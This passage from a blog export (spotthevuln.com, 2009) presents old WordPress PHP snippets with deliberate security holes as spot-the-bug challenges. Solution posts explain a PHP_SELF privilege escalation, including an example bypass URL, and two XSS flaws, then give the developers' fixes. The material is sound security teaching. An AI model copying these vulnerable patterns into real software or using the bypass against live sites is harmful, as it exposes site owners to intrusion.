		<description></description>
		<content:encoded><![CDATA[<blockquote>It's not true that life is one damn thing after another; it is one damn thing over and over.
- Edna St. Vincent Millay (1892 - 1950)</blockquote>
[ccnLe_php]

if ( '' != $qv['tb'] )
$this-&gt;is_trackback = true;

if ( '' != $qv['paged'] )
$this-&gt;is_paged = true;

if ( '' != $qv['comments_popup'] )
$this-&gt;is_comments_popup = true;

// if we're previewing inside the write screen
if ('' != $qv['preview'])
$this-&gt;is_preview = true;

if ( strpos($_SERVER['PHP_SELF'], 'wp-admin/') !== false )
$this-&gt;is_admin = true;

if ( false !== strpos($qv['feed'], 'comments-') ) {
$qv['feed'] = str_replace('comments-', '', $qv['feed']);
$qv['withcomments'] = 1;
}

$this-&gt;is_singular = $this-&gt;is_single || $this-&gt;is_page || $this-&gt;is_attachment;

if ( $this-&gt;is_feed &amp;&amp; ( !empty($qv['withcomments']) || ( empty($qv['withoutcomments']) &amp;&amp; $this-&gt;is_singular ) ) )
$this-&gt;is_comment_feed = true;

if ( !( $this-&gt;is_singular || $this-&gt;is_archive || $this-&gt;is_search || $this-&gt;is_feed || $this-&gt;is_trackback || $this-&gt;is_404 || $this-&gt;is_admin || $this-&gt;is_comments_popup ) )
$this-&gt;is_home = true;

// Correct is_* for page_on_front and page_for_posts
if ( $this-&gt;is_home &amp;&amp; ( empty($this-&gt;query) || $qv['preview'] == 'true' ) &amp;&amp; 'page' == get_option('show_on_front') &amp;&amp; get_option('page_on_front') ) {
$this-&gt;is_page = true;
$this-&gt;is_home = false;
$qv['page_id'] = get_option('page_on_front');
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>202</wp:post_id>
		<wp:post_date>2009-10-19 08:00:55</wp:post_date>
		<wp:post_date_gmt>2009-10-19 15:00:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-one-damn-thing</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e469acbc5180aa9edca925afa1a06618]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/4BlLsS]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>47</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Privilege Escalation PHP Code Example]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/10/privilege-escalation-one-damn-thing/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-10-23 08:21:47</wp:comment_date>
			<wp:comment_date_gmt>2009-10-23 15:21:47</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>One Damn Thing - Privilege Escalation</title>
		<link>http://spotthevuln.com/2009/10/privilege-escalation-one-damn-thing/</link>
		<pubDate>Fri, 23 Oct 2009 15:00:16 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=204</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: </strong><a title="Wordpress bugs" href="http://spotthevuln.com/category/software/wordpress/" target="_blank">Wordpress</a>

<strong>Fixed in Version: </strong>2.3.2

<strong>Issue Type:</strong> Privilege Escalation

<strong>Original Code: </strong><a title="Vulnerable Code" href="http://spotthevuln.com/2009/10/vulnerable-code-one-damn-thing/" target="_blank">Found Here</a>
<h2>Description</h2>
The vulnerable code here deals with the use of the $_SERVER[‘PHP_SELF’] global variable.  PHP_SELF has a few quirks that are not well understood by many developers and can easily introduce security issues in web applications.  If we take a look at the PHP manual page for $_SERVER[‘PHP_SELF’], we see the following:
<blockquote>The filename of the currently executing script, relative to the document root. For instance, <var>$_SERVER['PHP_SELF']</var> in a script at the address <var>http://example.com/test.php/foo.bar</var> would be <var>/test.php/foo.bar</var>.</blockquote>
Examining the example provided in the PHP manual page, we see that an attacker is free to specify an arbitrary value (foo.bar) after a valid php file (test.php).  This arbitrary value will be included in the $_SERVER[‘PHP_SELF’] global variable.

Examining the vulnerable WordPress source code, we see that the WordPress developers used the PHP strpos() function to check to whether the $_SERVER[‘PHP_SELF’] global variable contained the string “wp-admin/”.  If the strpos() function found the “wp-admin/” string within the $_SERVER[‘PHP_SELF’] variable, it would return TRUE which resulted in the setting of the "is_admin" value to true.  This ultimately granted the user administrative rights to certain portions of the web application.  The attacker could easily craft a request for a valid php file, while injecting the “wp-admin/” string into the $_SERVER[‘PHP_SELF’].  Such a request would look something like this:

http://wordpressblog.com/index.php/wp-admin/

The request above will request index.php from the server while setting the $_SERVER[‘PHP_SELF’] variable to /index.php/wp-admin/.  This tricks the vulnerable WordPress code into assuming the user is an administrator and grants the user administrative access to certain pages on the blog.

The WordPress developers addressed this vulnerability by removing the faulty checks and adding a function which was designed to determine whether the user has administrative privilege.
<h2>Developers Solution</h2>
[cce lang="diff"]

if ( '' != $qv['tb'] )
$this-&gt;is_trackback = true;

if ( '' != $qv['paged'] )
$this-&gt;is_paged = true;

if ( '' != $qv['comments_popup'] )
$this-&gt;is_comments_popup = true;

// if we're previewing inside the write screen
if ('' != $qv['preview'])
$this-&gt;is_preview = true;

- if ( strpos($_SERVER['PHP_SELF'], 'wp-admin/') !== false )
+ if ( is_admin() )
$this-&gt;is_admin = true;

if ( false !== strpos($qv['feed'], 'comments-') ) {
$qv['feed'] = str_replace('comments-', '', $qv['feed']);
$qv['withcomments'] = 1;
}

$this-&gt;is_singular = $this-&gt;is_single || $this-&gt;is_page || $this-&gt;is_attachment;

if ( $this-&gt;is_feed &amp;&amp; ( !empty($qv['withcomments']) || ( empty($qv['withoutcomments']) &amp;&amp; $this-&gt;is_singular ) ) )
$this-&gt;is_comment_feed = true;

if ( !( $this-&gt;is_singular || $this-&gt;is_archive || $this-&gt;is_search || $this-&gt;is_feed || $this-&gt;is_trackback || $this-&gt;is_404 || $this-&gt;is_admin || $this-&gt;is_comments_popup ) )
$this-&gt;is_home = true;

// Correct is_* for page_on_front and page_for_posts
if ( $this-&gt;is_home &amp;&amp; ( empty($this-&gt;query) || $qv['preview'] == 'true' ) &amp;&amp; 'page' == get_option('show_on_front') &amp;&amp; get_option('page_on_front') ) {
$this-&gt;is_page = true;
$this-&gt;is_home = false;
$qv['page_id'] = get_option('page_on_front');
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>204</wp:post_id>
		<wp:post_date>2009-10-23 08:00:16</wp:post_date>
		<wp:post_date_gmt>2009-10-23 15:00:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>privilege-escalation-one-damn-thing</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="privilege-escalation"><![CDATA[Privilege Escalation]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #solution #wordpress]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Privilege Escalation PHP Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Privilege Escalation Vulnerable Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[970f6efa27d6aefddc266fa4f59484f3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/qDnOz]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_316cbb281543d7eaa0869f20b40fb4de</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0892fd3773100b8a1ab842f0ca5020b2</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_bfa1dd76ea0130a620fca0dc7714ba89</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Silence Him!</title>
		<link>http://spotthevuln.com/2009/10/vulnerable-code-silence-him/</link>
		<pubDate>Mon, 26 Oct 2009 15:00:38 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=207</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>You have not converted a man because you have silenced him.
- John Viscount Morley</blockquote>
[ccnLe_php]

function convert_all() {
global $wpdb;

$wpdb-&gt;query("UPDATE $wpdb-&gt;term_taxonomy SET taxonomy = 'post_tag', parent = 0 WHERE taxonomy = 'category'");
clean_category_cache($category-&gt;term_id);
}

function init() {
echo '&lt;!--'; print_r($_POST); print_r($_GET); echo '--&gt;';

if (isset($_POST['maybe_convert_all_cats'])) {
$step = 3;
} elseif (isset($_POST['yes_convert_all_cats'])) {
$step = 4;
} elseif (isset($_POST['no_dont_do_it'])) {
die('no_dont_do_it');
} else {
$step = (isset($_GET['step'])) ? (int) $_GET['step'] : 1;
}

$this-&gt;header();

if (!current_user_can('manage_categories')) {
print '&lt;div&gt;';
print '&lt;p&gt;' . __('Cheatin’ uh?') . '&lt;/p&gt;';
print '&lt;/div&gt;';
} else {
switch ($step) {
case 1 :
$this-&gt;welcome();
break;

case 2 :
$this-&gt;convert_them();
break;

case 3 :
$this-&gt;convert_all_confirm();

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>207</wp:post_id>
		<wp:post_date>2009-10-26 08:00:38</wp:post_date>
		<wp:post_date_gmt>2009-10-26 15:00:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-silence-him</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#php #secure #coding]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[43f32f4fb409a7f662d91747ac1cece3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cB98nt]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>50</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/10/silence-him-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-10-30 08:10:22</wp:comment_date>
			<wp:comment_date_gmt>2009-10-30 15:10:22</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Silence Him! - XSS</title>
		<link>http://spotthevuln.com/2009/10/silence-him-xss/</link>
		<pubDate>Fri, 30 Oct 2009 15:00:46 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=209</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: </strong><strong><a title="WordPress bugs" href="http://spotthevuln.com/category/software/wordpress/" target="_blank">WordPress</a></strong>

<strong>Fixed in Version: 2.6</strong>

<strong>Issue Type: </strong><strong><a title="Cross Site Scripting" href="http://spotthevuln.com/category/vulnerability/xss/" target="_blank">Cross Site Scripting</a></strong>

<strong>Original Code: <a href="http://spotthevuln.com/2009/10/vulnerable-code-silence-him/">Found Here</a></strong>
<h2>Description</h2>
This is a classic Cross-Site Scripting (XSS) vulnerability.  The $_POST and the $_GET parameters passed to the vulnerable file are printed to the WordPress markup without being sanitized, exposing the vulnerability and making exploitation of this issue extremely simple.  The XSS Vulnerability was fixed by the WordPress team by simply removing the vulnerable code.

This particular issue is interesting because it contains valuable lessons for the software project manager.  The vulnerable code serves no purpose to enhance WordPress functionality.  In fact, the vulnerable code was actually checked in as “debugging” code used by the developer to debug a separate issue.  While most XSS vulnerabilities are simply a matter of implementation or coding mistakes, this particular issue (IMHO) is an indication of weaknesses in the software project management of the WordPress project.

The core of the issue stems from the fact that a developer was allowed to check-in debugging code into a production build.  Checking in this vulnerable code was most likely accidental. Problems with code check-in can be solved though the use of an informal buddy code review requirement, formal code review for check-ins to production, or even automation which scans the code quality for certain indicators.  <a href="http://msdn.microsoft.com/en-us/library/bb429476(VS.80).aspx" target="_blank">FxCop</a> and <a href="http://msdn.microsoft.com/en-us/library/ms933794.aspx" target="_blank">PreFast</a> are great examples of free, customizable automation that can provide a baseline indicator of code quality for check-ins, although neither of these can be used against a PHP code base.  The WordPress team should also consider purchasing a commercial source code scanner to provide a baseline analysis of code checked into production.  At minimum, when WordPress developers check-in to production should include “hotspotter” checks which highlight dangerous APIs/common coding errors (e.g. echo, print APIs, exec(), system() …etc.). This would greatly reduce the amount of vulnerable code that is checked-in to the production builds.

The vulnerable code was discovered over two years ago by the WordPress team.  Hopefully, the check-in process has improved and all new check-in’s undergo a baseline security check, either through automation or manual review.
<h2>Developers Solution</h2>
[cce lang="diff"]

function convert_all() {
global $wpdb;

$wpdb-&gt;query("UPDATE $wpdb-&gt;term_taxonomy SET taxonomy = 'post_tag', parent = 0 WHERE taxonomy = 'category'");
clean_category_cache($category-&gt;term_id);
}

function init() {
-               echo '&lt;!--'; print_r($_POST); print_r($_GET); echo '--&gt;';

if (isset($_POST['maybe_convert_all_cats'])) {
$step = 3;
} elseif (isset($_POST['yes_convert_all_cats'])) {
$step = 4;
} elseif (isset($_POST['no_dont_do_it'])) {
die('no_dont_do_it');
} else {
$step = (isset($_GET['step'])) ? (int) $_GET['step'] : 1;
}

$this-&gt;header();

if (!current_user_can('manage_categories')) {
print '&lt;div&gt;';
print '&lt;p&gt;' . __('Cheatin’ uh?') . '&lt;/p&gt;';
print '&lt;/div&gt;';
} else {
switch ($step) {
case 1 :
$this-&gt;welcome();
break;

case 2 :
$this-&gt;convert_them();
break;

case 3 :
$this-&gt;convert_all_confirm();

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>209</wp:post_id>
		<wp:post_date>2009-10-30 08:00:46</wp:post_date>
		<wp:post_date_gmt>2009-10-30 15:00:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>silence-him-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#xss #vulnerability #owasp]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c3AB9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[484b6e54a9c37307373ac7b8d559c2ac]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Left to Chance</title>
		<link>http://spotthevuln.com/2009/11/vulnerable-code-left-to-chance/</link>
		<pubDate>Mon, 02 Nov 2009 15:00:18 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=212</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>The generation of random numbers is too important to be left to chance.
- Robert R. Coveyou, Oak Ridge National Laboratory</blockquote>
[ccnLe_php]

&lt;h2&gt;&lt;?php _e('Importing...') ?&gt;&lt;/h2&gt;
&lt;?php
$cat_id = $_POST['cat_id'];
if (($cat_id == '') || ($cat_id == 0)) {
$cat_id  = 1;
}

$opml_url = $_POST['opml_url'];
if (isset($opml_url) &amp;&amp; $opml_url != '' &amp;&amp; $opml_url != 'http://') {
$blogrolling = true;
}
else // try to get the upload file.
{
$overrides = array('test_form' =&gt; false, 'test_type' =&gt; false);
$file = wp_handle_upload($_FILES['userfile'], $overrides);

if ( isset($file['error']) )
die($file['error']);

$url = $file['url'];
$opml_url = $file['file'];
$blogrolling = false;
}

if (isset($opml_url) &amp;&amp; $opml_url != '') {
$opml = wp_remote_fopen($opml_url);
include_once('link-parse-opml.php');

$link_count = count($names);
for ($i = 0; $i &lt; $link_count; $i++) {
if ('Last' == substr($titles[$i], 0, 4))
$titles[$i] = '';
if ('http' == substr($titles[$i], 0, 4))
$titles[$i] = '';

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>212</wp:post_id>
		<wp:post_date>2009-11-02 08:00:18</wp:post_date>
		<wp:post_date_gmt>2009-11-02 15:00:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-left-to-chance</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/956qjL]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0336bead7057506e0412ca005b33ed33]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>53</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/11/left-to-chance-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-11-06 11:17:34</wp:comment_date>
			<wp:comment_date_gmt>2009-11-06 18:17:34</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Left to Chance - XSS</title>
		<link>http://spotthevuln.com/2009/11/left-to-chance-xss/</link>
		<pubDate>Fri, 06 Nov 2009 15:00:17 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=214</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: <a title="WordPress Bugs" href="http://spotthevuln.com/category/software/wordpress/" target="_blank">WordPress</a></strong>

<strong>Fixed in Version: 2.0.11</strong>

<strong>Issue Type: <a title="Cross Site Scripting" href="http://spotthevuln.com/category/vulnerability/xss/" target="_blank">Cross Site Scripting</a></strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/11/vulnerable-code-left-to-chance/">Found Here</a>
<h2>Description</h2>
Yet another Cross Site Scripting vulnerability affecting WordPress.  In this case, the $cat_id variable is assigned a user controlled value and is used without sanitization.  It’s a little difficult to determine using the code sample below, but the $cat_id is displayed in WordPress markup in multiple locations without being sanitized.  More importantly, examining the WordPress source we see that almost of the variables are not thoroughly sanitized before being assigned to a variable or being used by the application.  The WordPress team should have a solid understanding of the data definitions for each of the variables it uses and should make an effort to ensure the user controlled data matches that data definition.  In the case of $cat_id, the WordPress developers understood that $cat_id should only have a numerical value and made use of the abs() function to help validate $_POST[‘cat_id’] before assigning the user controlled value to $cat_id.
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;h2&gt;&lt;?php _e('Importing...') ?&gt;&lt;/h2&gt;
&lt;?php
-              $cat_id = $_POST['cat_id'];
-              if (($cat_id == '') || ($cat_id == 0)) {
+              $cat_id = abs( (int) $_POST['cat_id'] );
+              if ( $cat_id &lt; 1 )
$cat_id  = 1;
-              }

$opml_url = $_POST['opml_url'];
if (isset($opml_url) &amp;&amp; $opml_url != '' &amp;&amp; $opml_url != 'http://') {
$blogrolling = true;
}
else // try to get the upload file.
{
$overrides = array('test_form' =&gt; false, 'test_type' =&gt; false);
$file = wp_handle_upload($_FILES['userfile'], $overrides);

if ( isset($file['error']) )
die($file['error']);

$url = $file['url'];
$opml_url = $file['file'];
$blogrolling = false;
}

if (isset($opml_url) &amp;&amp; $opml_url != '') {
$opml = wp_remote_fopen($opml_url);
include_once('link-parse-opml.php');

$link_count = count($names);
for ($i = 0; $i &lt; $link_count; $i++) {
if ('Last' == substr($titles[$i], 0, 4))
$titles[$i] = '';
if ('http' == substr($titles[$i], 0, 4))
$titles[$i] = '';

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>214</wp:post_id>
		<wp:post_date>2009-11-06 08:00:17</wp:post_date>
		<wp:post_date_gmt>2009-11-06 15:00:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>left-to-chance-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[226954fea66587d78ce20aac0ff1569a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
